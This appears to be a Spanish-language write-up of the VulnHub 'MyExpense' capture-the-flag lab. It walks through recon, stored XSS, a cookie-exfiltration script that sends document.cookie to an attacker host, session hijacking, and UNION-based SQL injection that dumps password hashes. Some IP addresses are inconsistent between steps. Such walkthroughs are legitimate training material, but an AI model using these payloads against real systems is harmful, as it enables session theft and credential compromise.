---
tags:
  - CTF
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/myexpense
dificultad: Media
os: Linux
relacionados:
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[Cookie Hijacking]]"
  - "[[SQL Injection (SQLi)]]"
  - "[[Bypass de Restricciones]]"
  - "[[Cracking Hashes]]"
---
#  VulnHub - My Expense

## Contexto del desafío

Eres **Samuel Lamotte**, recién despedido de "Furtura Business Informatique". Necesitas hackear la aplicación interna **MyExpense** para recuperar €750 de un informe de gastos pendiente. Tus credenciales (`samuel/fzghn4lw`) ya no funcionan, pero sigues conectado a la red Wi-Fi interna.  


---

## Reconocimiento

**Escaneo de puertos**:  
   - Ejecuté un escaneo agresivo con Nmap:  
     ```bash
     nmap -p- --open -sS -T5 --min-rate 5000 -Pn -n -vvv 192.168.1.10
     ```  
   - **Resultado**: Solo el puerto **80 (HTTP)** abierto.  


### Exploración web y primeros obstáculos

- **Panel de login**:  
  - Credenciales `samuel/fzghn4lw` fallan: _"Incorrect username or password"_.  

- **Fuzzing de rutas con GoBuster**:  
  ```bash
  gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
  ```  
  - Descubrí `/admin` (redirección 301).  

- **Archivos críticos en /admin/**:  
  ```bash
  gobuster dir -u http://192.168.1.10/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20
  ```  
  - Hallé `admin.php`: Panel de gestión de usuarios donde **Samuel aparece como "Inactive"**.  


---

## Explotación de vulnerabilidades

### Bypasseando restricciones

1. **Registro de usuarios**:  
   - El botón _"Sign up"_ estaba bloqueado (`disabled` en HTML).  
   - **Solución**: Usé DevTools para eliminar el atributo `disabled` y creé un usuario de prueba.  

2. **Confirmación de XSS**:  
   - Al registrar un usuario con el payload:  
     ```html
     <script>alert("XSS Funciona")</script>
     ```  
   - ¡Alerta exitosa! al ver usuarios en `admin.php`.  

### Robo de cookies con XSS

1. **Preparé un servidor HTTP local**:  
   ```bash
   python3 -m http.server 8080
   ```  
   (IP atacante: `192.168.1.8`)

2. **Script de exfiltración (`script.js`)**:  
   ```javascript
	var request = new XMLHttpRequest();
	request.open('GET', 'http://172.16.217.148:8080/?cookie=' + document.cookie);
	request.send();
   ```  

3. **Comentario malicioso**:  
   ```html
   <script src="http://192.168.1.8:8080/script.js"></script>
   ```  

4. **Resultado**:  
   - Cuando un admin accedió a `admin.php`, recibí su cookie:  
     ```log
     GET /?cookie=PHPSESSID=adm1n_c00k13...
     ```  

### Hackeando la sesión administrativa

1. **Secuestro de sesión**:  
   - Reemplacé mi cookie de sesión por la del admin (vía DevTools > Application > Cookies).  

2. **Error de autenticación única**:  
   - _"Sorry, as an administrator, you can be authenticated only once a time"_.  

3. **Automatización de la activación**:  
   - Modifiqué `script.js` para activar a Samuel automáticamente:  
     ```javascript
	var request = new XMLHttpRequest();
	request.open('GET', 'http://172.16.217.184/admin/admin.php?id=11&status=active');
	request.send();
     ```  
   - ¡Samuel cambió a **"Active"**!  

4. **Acceso exitoso**:  
   - Logué con `samuel/fzghn4lw` y vi el panel de usuario.  

### Explotando SQL Injection

- **Contexto**:  
  Necesitaba que un _"Financial Approver"_ (como `pbaudouin`) aprobara el reembolso.  

- **Pruebas en el parámetro `id`**:  
  ```sql
  http://192.168.1.10/admin/admin.php?id=2 UNION SELECT 1,database()
  ```  
  - Base de datos: **`myexpense`**.  

- **Extracción de credenciales**:  
  ```sql
  ?id=2 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password) FROM user
  ```  
  - **Resultado**:  
    ```log
    pbaudouin:9b3b437e7aa3e2a84d2d1d0e7ba3a8d4
    ```  

### Descubriendo el hash

En hashes.com se pone el hash recibido y da la contraseña `HackMe` para el usuario `pbaudouin.

---

## Bandera(s)

> [!FLAG] `flag{B4nd3r4}`
> H4CKY0URL1F3
^bandera

